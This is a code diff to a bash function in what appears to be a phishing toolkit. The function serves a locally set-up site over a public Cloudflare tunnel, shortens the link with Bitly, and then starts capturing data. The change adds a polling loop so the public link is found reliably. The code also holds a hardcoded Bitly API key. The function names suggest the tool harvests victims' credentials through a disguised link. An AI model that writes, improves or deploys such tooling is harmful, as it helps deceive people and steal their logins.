@@ -234,25 +234,52 @@ start_localhost() {
 }
 
 start_cloudflared() {
-    BITLY_API_KEY="ef268f2a6d35c286b6cad7de99de658e2d6f34f4"
+    BITLY_API_KEY="ef268f2a6d35c286b6cad7de99de658e2d6f34f4" # Note: This public key might not work.
     random_port
-    echo -e "\n${BRIGHT_GREEN}[+] Launching Cloudflared tunnel on port $PORT...${NC}
-    "
+    echo -e "\n${BRIGHT_GREEN}[+] Launching Cloudflared tunnel on port $PORT...${NC}"
+    
     setup_site
     php -S "$HOST:$PORT" > /dev/null 2>&1 &
-    sleep 5
+    
+    # Remove old log file to avoid reading a stale URL
+    rm -f .cfurl.log
+    
+    # Start cloudflared in the background
     cloudflared tunnel --url "http://$HOST:$PORT" > .cfurl.log 2>&1 &
 
-    URL=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare.com' .cfurl.log | head -n 1)
-if [[ $URL ]]; then
-    SHORT_URL=$(shorten_url "$URL")
-    echo -e "${BRIGHT_GREEN}[✓] LIVE URL: ${BRIGHT_CYAN}$URL${NC}
-    "
-    echo -e "${BRIGHT_GREEN}[✓] Shortened URL: ${BRIGHT_CYAN}$SHORT_URL${NC}
-    "
-    capture_data
+    # --- NEW RELIABLE LOGIC STARTS HERE ---
+    
+    echo -e "${BRIGHT_YELLOW}[•] Waiting for Cloudflared URL... (Max 20 seconds)${NC}"
+    URL=""
+    # Loop for 20 seconds, checking for the URL every second
+    for i in {1..20}; do
+        # Grep the URL from the log file
+        URL=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare.com' .cfurl.log | head -n 1)
+        if [[ -n "$URL" ]]; then
+            # If URL is found, break the loop
+            break
+        fi
+        sleep 1
+    done
+
+    # --- NEW RELIABLE LOGIC ENDS HERE ---
+
+    # Check if the URL was found or if the loop timed out
+    if [[ -n "$URL" ]]; then
+        SHORT_URL=$(shorten_url "$URL")
+        echo -e "${BRIGHT_GREEN}[✓] LIVE URL: ${BRIGHT_CYAN}$URL${NC}"
+        # Check if Bitly URL was created successfully
+        if [[ -n "$SHORT_URL" ]]; then
+            echo -e "${BRIGHT_GREEN}[✓] Shortened URL: ${BRIGHT_CYAN}$SHORT_URL${NC}"
+        else
+            echo -e "${BRIGHT_YELLOW}[!] Could not shorten URL. The Bitly API key might be invalid.${NC}"
+        fi
+        echo "" # Add a newline for better formatting
+        capture_data
     else
-        echo -e "${RED}[!] Failed to generate Cloudflared URL.${NC}"
+        echo -e "${RED}[!] Failed to generate Cloudflared URL after 20 seconds.${NC}"
+        echo -e "${YELLOW}[!] Check the log for errors:${NC}"
+        cat .cfurl.log
     fi
 }
 
